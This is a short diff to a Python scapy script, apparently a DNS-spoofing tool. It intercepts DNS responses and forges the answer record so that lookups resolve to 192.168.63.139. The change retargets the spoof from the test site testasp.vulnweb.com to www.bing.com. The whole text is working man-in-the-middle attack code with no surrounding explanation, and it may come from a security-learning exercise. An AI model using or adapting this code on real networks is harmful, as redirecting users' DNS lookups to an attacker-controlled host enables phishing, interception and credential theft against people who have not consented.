@@ -10,9 +10,8 @@ def process_packet(packet):
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
         qname = scapy_packet[DNSQR].qname
-        qname_str = qname.decode('utf-8')
-        if "testasp.vulnweb.com" in qname_str:
-            print("[+] Spoofing Target is in: " + qname_str )
+        if b"www.bing.com" in qname:
+            print("[+] Spoofing Target", end=" ")
             answer = DNSRR(rrname=qname, rdata="192.168.63.139")
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
